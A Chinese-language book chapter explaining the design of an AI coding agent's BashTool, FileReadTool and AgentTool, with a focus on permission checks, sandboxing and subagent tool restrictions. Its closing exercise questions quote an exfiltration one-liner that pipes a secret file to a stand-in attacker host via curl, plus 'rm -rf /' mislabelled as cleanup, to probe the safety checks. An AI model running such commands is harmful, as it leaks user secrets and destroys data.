# Chapter 7: 40 个工具巡礼 -- 从文件读写到浏览器

> 本章不是 40 个工具的清单。从工具目录中的 40 多个工具中，我们选取三个最具代表性的案例，展示工具设计中最核心的取舍：安全性 vs 能力（BashTool）、效率 vs 正确性（FileReadTool）、简洁 vs 通用（AgentTool）。

上一章解剖了工具的骨架 -- Tool 类型的每一个字段。本章穿上血肉，走进真实的工具实现，看看那些抽象的接口方法在具体场景中是如何被填充的。

```
┌─────────────── Harness ───────────────┐
│                                       │
│   Agent Loop ──▶ API ──▶ LLM         │
│       │                               │
│       ▼                               │
│   工具系统                              │
│   ┌──────────────────────────┐       │
│   │ ★ BashTool     安全 vs 能力│       │
│   │ ★ FileReadTool 效率 vs 正确│       │
│   │ ★ AgentTool    简洁 vs 通用│       │
│   │   ... 其余 37 个工具 ...   │       │
│   └──────────────────────────┘       │
│                                       │
└───────────────────────────────────────┘
本章聚焦：三个代表性工具的实现细节与设计取舍
```

## 7.1 BashTool -- 最危险的工具怎么安全化？

**问题：Shell 命令是最强大的工具，也是最危险的。如何在不阉割能力的前提下控制风险？**

BashTool 是整个工具系统中最复杂的单体组件，超过 2000 行代码。它的复杂性不来自功能实现本身（调用 shell 执行命令并不难），而来自一个根本矛盾：你需要让 LLM 拥有执行任意 shell 命令的能力，同时防止它做出不可逆的破坏。这种矛盾不可能完美解决，只能通过多层防线来管理风险。让我们逐层剖析 BashTool 的核心设计决策。

### 思路一：用 schema 设计容忍模型的"不精确"

BashTool 的输入 schema 展示了面向 LLM 的接口设计与面向人类的接口设计之间的差异：

```pseudocode
// BashTool 输入 schema 的宽松解析（概念示意）
timeout: semanticNumber(optional Number),
run_in_background: semanticBoolean(optional Boolean),
```

`semanticNumber` 和 `semanticBoolean` 是"宽松解析器"。LLM 有时会把 `true` 输出为字符串 `"true"`，把数字 `5000` 输出为 `"5000"`。人类程序员不会犯这种错误，但 LLM 的输出本质是 token 序列的概率采样，类型边界时常模糊。与其拒绝这些"近似正确"的输入并让模型看到验证错误（它可能不理解错误的原因），不如用一层静默转换来吸收差异。这是面向 LLM 的 API 设计中一个普适的策略：宽进严出。

更微妙的是一个内部字段 `_simulatedSedEdit`。这是一个永远不暴露给模型的字段 -- 通过 `omit` 从外部 schema 中移除。它的存在解决了一个权限预览的一致性问题：当模型发出一条 `sed` 命令，系统在权限对话框中展示文件 diff 预览。用户批准后，如果再实际执行 `sed`，结果可能与预览不同（文件在预览和执行之间被修改了）。这个内部字段让系统把预计算的编辑结果直接注入，绕过实际执行，确保"所见即所得"。

为什么要用 `omit` 而不是简单地不声明？因为安全。如果模型能在 schema 中看到这个字段，它就可以构造一个无害命令搭配任意文件写入，绕过权限检查和沙箱。Schema 是模型的可见能力边界 -- 隐藏字段等于关闭攻击面。

### 思路二：并发安全性是命令的函数，不是工具的常量

BashTool 的并发安全判断展示了第 6 章"按调用判断"原则的落地：

```pseudocode
// BashTool 并发安全判断链（概念示意）
isConcurrencySafe(input):
  return this.isReadOnly(input) ?? false

isReadOnly(input):
  hasCd = commandHasAnyCd(input.command)
  result = checkReadOnlyConstraints(input, hasCd)
  return result.behavior == 'allow'
```

判断链条是：并发安全 <- 只读 <- 命令 AST 分析。只读约束检查会解析命令的抽象语法树，识别只读命令（`cat`、`ls`、`grep`），检测 `cd`（改变工作目录是副作用），检测管道写入。只有整条命令链都是只读时，才允许并行。

这意味着 `cat a.txt | grep pattern` 可以和其他 Read 操作并行执行，而 `cat a.txt | python script.py` 不行 -- 因为 `python script.py` 的副作用不可知。保守但正确。

还有一个与安全相关的细节：BashTool 支持沙箱模式，在沙箱中执行命令以限制其对文件系统和网络的访问。模型可以通过参数请求禁用沙箱 -- 参数名中的 "dangerously" 前缀是一种"命名即文档"的安全设计，让模型（和审计者）意识到这是一个高风险操作。UI 中的工具名称也会相应变化：启用沙箱时显示 `SandboxedBash` 而非 `Bash`，给用户一个视觉信号。

BashTool 还支持后台执行（`run_in_background` 参数）。当命令预计运行时间较长时（如 `npm install`、`cargo build`），模型可以选择在后台运行，立即获得一个任务 ID 和输出文件路径，稍后用 Read 工具检查结果。但不是所有命令都适合后台化 -- 某些命令（如 `sleep`）被排除，应该用 MonitorTool 替代。在"助手模式"下，阻塞超过 15 秒的命令会被自动后台化，这是一种以用户体验为导向的超时策略。

### 思路三：用命令分类驱动 UI 折叠

BashTool 定义了三组命令分类：

```pseudocode
// 命令分类（概念示意）
BASH_SEARCH_COMMANDS = Set([
  'find', 'grep', 'rg', 'ag', 'ack', 'locate', 'which', 'whereis'
])
BASH_READ_COMMANDS = Set([
  'cat', 'head', 'tail', 'less', 'more', 'wc', 'stat', 'file', 'strings',
  'jq', 'awk', 'cut', 'sort', 'uniq', 'tr'
])
BASH_LIST_COMMANDS = Set(['ls', 'tree', 'du'])
```

这些分类不影响执行逻辑，只影响 UI 呈现。搜索/读取命令分析函数检查管道中的**每一段**命令。对于 `cat file | grep pattern | sort`，每段都是读/搜索命令，整条命令标记为可折叠 -- UI 将其缩成一行摘要。但管道中任何一段不是读/搜索命令（如 `cat file | python script.py`），就不折叠。

"语义中性"命令（`echo`、`printf`、`true`、`false`、`:`）在判断中被跳过。`ls dir && echo "---" && ls dir2` 中，`echo` 不改变整条命令的"读/搜索"性质，所以仍然可折叠。这种精细到单个管道段的分类逻辑，让 UI 在简洁和准确之间找到了平衡。

### 思路四：权限匹配需要解析命令 AST

BashTool 的权限匹配准备函数展示了另一个安全设计。当 hooks 系统需要判断一条命令是否匹配某个权限规则（比如 `Bash(git *)` 匹配所有 git 命令）时，它不能简单地做字符串匹配。

考虑命令 `FOO=bar git push`。字符串匹配 `git *` 会失败（因为命令以 `FOO=bar` 开头），但语义上这确实是一个 git 命令。安全解析器提取命令 AST，提取每个子命令的 argv（去掉前导的环境变量赋值），然后对 argv 做模式匹配。

对于复合命令（如 `ls && git push`），匹配逻辑是"任意子命令匹配就触发 hook"。原因是 hook 的语义是 deny-like -- "没有匹配 = 跳过 hook"。如果不拆分复合命令，`ls && git push` 就不会触发 `Bash(git *)` 的安全 hook，这就是一个安全漏洞。

当 AST 解析失败（命令语法畸形或过于复杂）时，权限匹配函数返回"匹配所有" -- 让所有 hook 都运行。这又是安全关闭原则的体现：无法判断时，选择更严格的路径。


## 7.2 FileReadTool -- 最常用的工具怎么高效化？

**问题：文件读取是 Agent 最频繁的操作。当 18% 的读取是重复的，怎么在不影响正确性的前提下节省 token？**

FileReadTool 的代码量远少于 BashTool，但它处理的边界情况密度更高。它要处理五种文件类型（文本、图片、PDF、Notebook、SVG），每种都有不同的读取逻辑、大小控制和返回格式。它的 `maxResultSizeChars` 设为 `Infinity`，这意味着它的结果永远不会被持久化到磁盘 -- 它自己通过 token 限制和字节大小限制控制输出。我们聚焦四个最有启发性的设计。

### 思路一：基于 mtime 的智能去重

FileReadTool 实现了一个精巧的去重机制：

```pseudocode
// 基于文件修改时间的去重（概念示意）
existingState = dedupEnabled ? readFileState.get(fullFilePath) : undefined
if existingState
   and not existingState.isPartialView
   and existingState.offset is defined:
  rangeMatch = (existingState.offset == offset and existingState.limit == limit)
  if rangeMatch:
    mtimeMs = await getFileModificationTime(fullFilePath)
    if mtimeMs == existingState.timestamp:
      return { data: { type: 'file_unchanged', file: { filePath } } }
```

在 Agent 对话中，模型经常对同一个文件调用多次 Read（比如编辑后确认结果）。如果文件未修改且读取范围相同，返回一个 `file_unchanged` 存根，而不是重新发送全部内容。数据分析显示约 18% 的 Read 调用是同文件碰撞。

但去重有一个陷阱：`existingState.offset is defined` 这个条件看似多余，实际上至关重要。FileEditTool 和 FileWriteTool 编辑文件后也会更新文件状态缓存（写入编辑后的 mtime），但它们的 offset 设为 `undefined`。如果对 Edit 后的状态做去重匹配，`file_unchanged` 会指向编辑**前**的 Read 内容 -- 模型会错误地认为文件没变。`offset is defined` 区分了"来自 Read 的状态"和"来自 Edit/Write 的状态"。

还有一个有趣的边界情况：macOS 截图文件的路径处理。macOS 不同版本在截图文件名中 AM/PM 前使用不同的空格字符 -- 有的用普通空格（U+0020），有的用窄不换行空格（U+202F）。当模型尝试读取一个截图文件却找不到时，FileReadTool 会自动尝试替换空格字符的变体。这种"帮用户（或模型）修正路径"的防御性设计，体现了工具与现实世界的对接往往充满这类平台特异性的细节。

### 思路二：路径即防线

FileReadTool 定义了一组被阻断的设备路径：

```pseudocode
// 阻断的设备路径（概念示意）
BLOCKED_DEVICE_PATHS = Set([
  '/dev/zero',     // 无限输出 -- 永远不会到达 EOF
  '/dev/random',   // 无限输出
  '/dev/urandom',  // 无限输出
  '/dev/stdin',    // 阻塞等待输入
  '/dev/tty',      // 阻塞等待输入
  '/dev/console',  // 阻塞等待输入
  '/dev/stdout',   // 读取无意义
  '/dev/stderr',   // 读取无意义
])
```

这是纯粹的路径检查，没有任何 I/O 操作。为什么不等到读取时再处理错误？因为读取 `/dev/zero` 不会报错 -- 它会无限输出零字节，进程永远不会返回。这不是一个"可以用超时兜底"的问题：一旦开始读取，进程就陷入了永不结束的 I/O 循环。

这体现了一条安全设计原则：**在最早的阶段用最轻量的手段拦截**。路径检查在输入验证中完成，零 I/O 开销，比执行方法中的任何防御都更早、更便宜。

类似的防御还包括 UNC 路径检查。在 Windows 上，以 `\\` 或 `//` 开头的路径是 UNC 网络路径。如果在权限检查前就做文件操作，可能泄露 NTLM 凭据。所以 UNC 路径在输入验证中只做格式检查，实际的文件系统操作推迟到用户授权之后。防御的时序和分层，在安全设计中至关重要。

### 思路三：读一个文件能触发 skill 发现

FileReadTool 在读取文件时包含一段看似不相关的逻辑：

```pseudocode
// 读取文件时触发 skill 发现（概念示意）
newSkillDirs = await discoverSkillDirsForPaths([fullFilePath], cwd)
if newSkillDirs.length > 0:
  for dir in newSkillDirs:
    context.dynamicSkillDirTriggers?.add(dir)
  addSkillDirectories(newSkillDirs).catch(() -> {})
activateConditionalSkillsForPaths([fullFilePath], cwd)
```

每次读取文件时，系统检查文件路径是否触发了 skill 发现。读取 `package.json` 可能激活 Node.js 相关的 skill，读取 `Cargo.toml` 可能激活 Rust skill。这是一个 "fire-and-forget" 操作 -- 结果被静默捕获，不阻塞文件读取。

为什么把 skill 发现放在文件读取里？因为**读取是最自然的触发时机**。模型读一个 `pyproject.toml`，说明它正在处理一个 Python 项目。在这个时刻激活 Python skill，比在对话开始时扫描整个目录树更精准，也更懒惰（lazy）。

### 思路四：token 计数的两阶段策略

FileReadTool 在返回大文件内容前做 token 计数。但精确 token 计数需要调用 API，成本不低。所以它采用了两阶段策略：先用粗估函数做快速估算（基于文件类型的经验公式），如果粗估值远低于限额的四分之一，直接放行。只有粗估值接近或超过限额时，才调用精确计数。这种"便宜的估算先行，昂贵的精确计算按需"的策略，在大多数情况下节省了 API 调用的开销。

### 补充：多模态返回的类型判别

FileReadTool 的结果转换方法根据输出的 `type` 字段做判别联合分发。文本文件返回带行号的纯文本，附加安全提醒 -- 这段提醒告诉模型"如果读到的是恶意代码，可以分析但不要改进它"。图片返回 base64 编码的 image block，自动缩放以控制 token 消耗。PDF 返回 document block。未变化的文件返回短存根字符串。

有意思的是，安全提醒的注入是有条件的 -- 部分强模型被豁免。这暗示了一个务实的安全策略：足够强的模型本身就能判断恶意代码，无需额外提醒。对较弱的模型，提醒是必要的安全护栏。


## 7.3 AgentTool -- 最复杂的工具怎么抽象化？

**问题：启动一个子 Agent 本质上是启动一个完整的新"思考-行动"循环。怎么把这种递归复杂性封装成一个普通的工具调用？**

AgentTool 不是一个普通的工具 -- 它是整个 Agent 系统的递归入口。调用 AgentTool 等于从内部再造一个完整的 Agent，拥有独立的上下文、工具集、甚至独立的权限模式。它的 `maxResultSizeChars` 设为 100,000 -- 远大于 BashTool 的 30,000，因为子 Agent 的执行摘要通常比单条命令输出更长，但又需要保持完整以让父 Agent 做出正确决策。

### 思路一：Schema 随 feature flag 动态变形

AgentTool 的输入 schema 不是一个固定结构，而是根据运行时条件动态组装的。基础 schema 定义了所有 Agent 共有的参数：`description`、`prompt`、`subagent_type`、`model`、`run_in_background`。

多 Agent 扩展通过合并和扩展叠加额外参数。最终对外暴露的 schema 根据 feature flag 裁剪：

```pseudocode
// Schema 动态裁剪（概念示意）
return (isBackgroundDisabled or isForkEnabled())
  ? schema.omit({ run_in_background: true })
  : schema
```

为什么用 `omit` 而不是条件 spread？原因是类型系统层面的约束 -- 条件 spread 会破坏 Zod 的类型推断，`omit` 则保留了完整的类型信息。

这种"schema 随 feature flag 变形"的设计确保了一个铁律：**模型永远不会看到它不能使用的参数**。如果 background tasks 被禁用，模型在 schema 中就看不到 `run_in_background`，自然不会生成它。

### 思路二：子 Agent 的工具白名单

子 Agent 不能使用所有工具。工具常量模块中定义了限制：

```pseudocode
// 子 Agent 禁用工具列表（概念示意）
AGENT_DISALLOWED_TOOLS = Set([
  TASK_OUTPUT_TOOL,           // 子 Agent 不应直接对外输出
  EXIT_PLAN_MODE_TOOL,        // 计划模式是主线程的 UI 抽象
  ENTER_PLAN_MODE_TOOL,       // 同上
  conditionally(AGENT_TOOL),  // 外部用户默认禁止嵌套 Agent
  ASK_USER_QUESTION_TOOL,     // 子 Agent 无 UI，会阻塞
  TASK_STOP_TOOL,             // 需要主线程任务状态
])
```

每个禁用都有具体理由：

- 任务输出工具被禁止 -- 它是向外部（如 CI 系统）输出结果的通道，子 Agent 不应该直接对外输出。
- 子 Agent 不能进入计划模式 -- 那是主线程的 UI 抽象，在子 Agent 的无 UI 环境中没有意义。
- 子 Agent 不能直接询问用户 -- 它通过主 Agent 间接交互，问询工具在无 UI 环境中会阻塞。
- 任务停止工具被禁止 -- 它需要访问主线程的任务状态来停止其他 Agent，子 Agent 没有这个权限。
- 最微妙的一条：是否允许子 Agent 再启动子 Agent（递归嵌套），取决于用户类型。内部用户允许嵌套 Agent 以支持复杂的多 Agent 协作场景，外部用户默认禁止以控制成本和复杂度。

### 思路三：五条执行路径，一个入口

AgentTool 的执行方法是代码库中最长的单方法之一，因为它要处理五种截然不同的执行模式：

1. **同步 Agent**：启动子 Agent，等待其完成，返回结果摘要。最常用的路径。
2. **异步/后台 Agent**：启动后立即返回 agent ID 和输出文件路径，调用者稍后检查进度。适合长时间任务。
3. **Teammate Agent**：通过 tmux 窗格启动独立进程，拥有自己的终端和输出。适合需要人机交互的协作场景。
4. **Remote Agent**：在远程环境中启动，完全解耦。适合计算密集型任务。
5. **Worktree 隔离**：在 git worktree 中启动，拥有独立的文件系统副本，避免与主线程的文件操作冲突。适合并行修改同一仓库的不同分支。

这五条路径共享同一个入口点和 schema，模型不需要知道底层的分发逻辑。它只需要说"给我启动一个 Agent 做这件事"，系统根据参数组合自动路由到正确的路径。

这是 AgentTool 最重要的抽象贡献：**把"启动另一个 Agent"这件事的多种复杂实现，统一到一个工具调用的语义下**。模型的认知负担是固定的，系统的能力却可以随新路径的添加而扩展。

### 补充：进度转发的双通道

AgentTool 转发两种进度事件：Agent 状态变化和子 Agent 中 shell 命令的 stdout/stderr 更新。这让外层 Agent 和 UI 能实时看到嵌套执行的进展 -- 当子 Agent 在运行一个长编译命令时，用户不会看到空白等待，而是看到编译输出的流式更新。

这种"进度穿透"设计意味着 AgentTool 不只是一个"发起并等待"的工具，它是一个**透明的执行代理**，把内部执行的细节向外暴露，同时保持工具调用的简洁接口。

AgentTool 的 `maxResultSizeChars` 为 100,000 -- 在所有工具中最高（除了 FileReadTool 的 Infinity）。这反映了子 Agent 执行结果的特殊性：它不是一条命令的输出或一个文件的内容，而是一个完整任务的执行摘要，可能包含多轮工具调用的结果汇总。截断这个摘要可能导致父 Agent 丢失关键信息。


## 7.4 横切对比：三个工具的设计模式

纵观 BashTool、FileReadTool、AgentTool，几个共性模式反复出现，揭示了工具设计的深层规律：

**模式一：lazySchema。** 三个工具都用惰性 schema 包装输入定义。原因是 Zod schema 的构建可能引用运行时值（配置项、feature flag、环境变量），而模块加载顺序不可控。惰性求值确保 schema 在首次使用时才构建，避免了加载期的循环依赖和时序问题。

**模式二：validateInput 与 checkPermissions 的分离。** `validateInput` 做纯粹的参数合法性检查（路径存在吗？范围有效吗？设备路径安全吗？），不涉及用户交互，失败后直接返回错误消息给模型，成本极低。`checkPermissions` 做权限决策，可能触发 UI 对话框等待用户确认，成本较高。分离让验证失败快速反馈（毫秒级），权限拒绝走完整的交互流程（可能等待秒级的用户响应）。

**模式三：路径提取和输入规范化的元数据意义。** 文件相关工具实现路径提取方法，返回操作涉及的文件路径。这个方法不是给执行用的，而是给外部系统用的 -- hooks、权限规则、分析系统都通过它知道工具在操作哪个文件，而不需要解析工具的完整输入。

与之相关的是输入规范化方法，它在 hooks 和 SDK 观察者看到输入之前，把相对路径扩展为绝对路径。这确保了权限 allowlist 不会被 `~` 或相对路径绕过 -- 观察者总是看到规范化的绝对路径。

**模式四：maxResultSizeChars 的策略分层。** `Infinity`（FileReadTool）表示"我自己控制大小"；`100_000`（AgentTool）表示"输出大但需要完整性"；`30_000`（BashTool）表示"命令输出通常不需要太大"。这些数字不是随意选择的 -- 它们反映了每个工具输出特征的经验判断。

**模式五：strict 模式的选择性启用。** BashTool 和 FileReadTool 都启用了 strict 模式。这个标记让 API 在处理工具调用时更严格地遵循 schema 约束。并非所有工具都启用了 strict -- 这是一个需要权衡的选择。strict 模式减少了模型输出格式错误的概率，但也可能在某些边界情况下过度拒绝合理的输入。

**模式六：安全分类器输入的语义提取。** 每个工具为自动权限分类器提供紧凑的输入表示。BashTool 返回命令本身（命令就是安全判断的依据），FileReadTool 返回文件路径（路径暗示了操作的安全性），而许多低风险工具返回空字符串（跳过分类器 -- 没有安全相关的信息可提取）。这个设计暗示了一个原则：**安全分类的成本应与风险成正比**。


## 7.5 工具之间的隐含契约

工具不是孤立运行的。它们通过共享的执行上下文和文件状态缓存形成隐含的协作关系，共同构成了一个"工具生态"。

**FileReadTool 与 FileEditTool 的状态共享。** Edit 操作后更新文件状态缓存的 mtime，这样后续的 Read 不会返回 `file_unchanged`（文件确实变了），而是返回编辑后的新内容。但 Edit 故意把 offset 设为 `undefined`，阻止去重机制误匹配。

**BashTool 的 sed 编辑与 FileEditTool 的桥接。** 当 Bash 命令是一条 sed 编辑，安全解析器解析它，在权限对话框中展示文件 diff 预览。用户批准后，走模拟编辑路径直接写入 -- 这条路径最终更新了文件状态缓存，让后续的 FileRead 能感知到变更。

**AgentTool 与 ToolSearchTool 的工具发现链。** 子 Agent 的工具集经过过滤。如果子 Agent 需要使用被过滤掉的工具，它可以调用 ToolSearch -- 但 ToolSearch 的搜索范围也受过滤影响。

这些协作关系不是通过显式接口约定的，而是通过共享状态间接发生。这种设计灵活但也脆弱 -- 修改一个工具更新文件状态缓存的时机，可能影响另一个工具的去重正确性。这是实用工程中"简洁性"和"显式性"之间永恒的张力。

还有一条跨工具的兄弟取消机制值得提及。当多个工具并行执行时，一个 Bash 命令出错会取消所有兄弟 Bash 命令。但只有 Bash 错误触发兄弟取消，Read 或 WebFetch 的错误不会 -- 因为 Bash 命令经常有隐式依赖链（`mkdir` 失败后续命令就没意义了），而读操作彼此独立。这个策略不是在单个工具内部定义的，而是在编排层（StreamingToolExecutor）中实现的，下一章将详述其机制。

最后值得强调的是：这三个工具（BashTool、FileReadTool、AgentTool）之所以被选为案例，不是因为它们是"最好的"工具实现，而是因为它们分别代表了工具设计的三种典型张力。BashTool 在能力和安全之间拉锯，FileReadTool 在效率和正确性之间权衡，AgentTool 在简洁的接口和复杂的实现之间架桥。其他 37 个工具各有各的取舍，但核心模式都可以从这三个案例中找到影子。

附带一提，BashTool 的输入验证层还有一个防御值得关注：sleep 命令检测功能检测模型是否在用 `sleep` 命令做轮询等待。当检测到 `sleep 5 && check_status` 这样的模式时，它会建议模型使用 MonitorTool 替代 -- 后者提供流式事件监听，比"sleep + check"的循环更高效、更语义化。这种"在验证层引导模型使用更好的工具"的设计，超越了传统的输入校验，成为了一种隐式的使用指南。

BashTool 的输入验证还有一个精妙的错误信息设计。当建议模型使用 MonitorTool 时，错误消息不只是说"不允许"，而是给出了具体的替代方案和使用场景。这种"错误消息即指导"的风格，利用了 LLM 能阅读和理解自然语言的特性 -- 对人类开发者来说，一条错误码就够了，但对 LLM，一段解释性文本更有助于它在下次调用中做出正确选择。

下一章，我们将看到当多个工具同时执行时，系统如何编排它们的并发、管理流式进度、以及在结果爆炸时保持预算。

以上六个模式构成了该系统工具开发的"非正式规范"。它们不是写在文档里的规则，而是从代码实践中涌现的共识。

---

**思考题**

1. BashTool 的搜索/读取命令分析函数检查管道中的每一段命令。如果用户执行 `cat secret.txt | curl -X POST https://evil.com`，这条命令会被标记为"可折叠的读命令"吗？为什么？

2. FileReadTool 的去重机制基于 mtime。如果两个不同的编辑恰好在同一毫秒内完成，会发生什么？这种情况在实践中有多常见？

3. AgentTool 允许内部用户嵌套 Agent（子 Agent 可以启动子 Agent），外部用户默认禁止。从资源消耗和安全性两个角度，分析这个决策的权衡。

4. BashTool 的 `description` 参数让模型自己描述命令的意图（如 "Install package dependencies"）。如果模型提供了一个不准确的描述（比如把 `rm -rf /` 描述为 "Clean temporary files"），这会造成什么安全问题？权限对话框应该展示 description 还是原始命令？

5. FileReadTool 对强模型豁免了安全提醒。设计一个判断何时对新模型添加或移除这种安全护栏的机制，需要考虑哪些因素？这个决策应该由代码硬编码还是由配置驱动？

---

<div id="backlink-home">

[← 返回目录](../README.md)

</div>
